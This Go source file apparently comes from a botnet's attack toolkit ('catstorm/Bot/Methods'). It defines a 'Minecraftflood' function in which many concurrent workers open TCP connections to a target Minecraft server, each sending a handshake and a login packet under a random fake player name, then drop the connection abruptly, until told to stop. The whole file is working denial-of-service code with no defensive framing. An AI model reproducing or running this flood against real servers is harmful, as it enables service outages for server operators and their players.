package l4

import (
	"context"
	"encoding/binary"
	"fmt"
	"net"
	"time"
	"catstorm/Bot/Methods"
)

func writeVarInt(v int32) []byte {
	b := make([]byte, 0, 5)
	for {
		val := byte(v & 0x7F)
		v >>= 7
		if v != 0 {
			val |= 0x80
		}
		b = append(b, val)
		if v == 0 {
			break
		}
	}
	return b
}

func mcString(s string) []byte {
	raw := []byte(s)
	ln := writeVarInt(int32(len(raw)))
	return append(ln, raw...)
}

func mcPacket(id int32, data ...[]byte) []byte {
	pid := writeVarInt(id)
	pidLen := len(pid)
	for _, d := range data {
		pidLen += len(d)
	}
	ln := writeVarInt(int32(pidLen))
	out := append(ln, pid...)
	for _, d := range data {
		out = append(out, d...)
	}
	return out
}

var mcPrefix = []string{"xX_", "XX_", "_", "Mr", "Ms", "Sir", "Da", "El", "Pro", "The", "iTz", "Its", "ii", "xC", "Xx"}
var mcSuffix = []string{"_xX", "_Xx", "_", "YT", "OP", "HD", "XD", "PvP", "Pro", "MC", "HD", "XD", "Craft", "Build", "Sky", "Fire", "Dark", "Star", "King", "Queen", "Wolf", "Bear", "Lord", "Night", "Dragon", "Slayer", "Gamer", "Noob", "Creeper", "Ender", "Hero", "Zombie", "Sword", "Shield", "Archer", "Wizard", "Ninja"}

func Minecraftflood(ctx context.Context, target, port string, sec int) {
	addr := net.JoinHostPort(target, port)
	workers := methods.Workers()

	proto := int32(754)
	nextState := int32(2)

	for w := 0; w < workers; w++ {
		go func() {
			rng := methods.NewXorShift64()
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				con, err := net.DialTimeout("tcp", addr, 5*time.Second)
				if err != nil {
					time.Sleep(10 * time.Millisecond)
					continue
				}

				handshake := mcPacket(0x00,
					writeVarInt(proto),
					mcString(target),
					binary.BigEndian.AppendUint16(nil, uint16(rng.Uint64()%65536)),
					writeVarInt(nextState),
				)

				username := mcPrefix[int(rng.Uint64()%uint64(len(mcPrefix)))] + mcSuffix[int(rng.Uint64()%uint64(len(mcSuffix)))] + fmt.Sprintf("%d", int(rng.Uint64()%999))
				login := mcPacket(0x00, mcString(username))

				con.SetWriteDeadline(time.Now().Add(3 * time.Second))
				con.Write(handshake)
				con.Write(login)

				if tcp, ok := con.(*net.TCPConn); ok {
					tcp.SetLinger(0)
				}
				con.Close()
			}
		}()
	}
	<-ctx.Done()
}
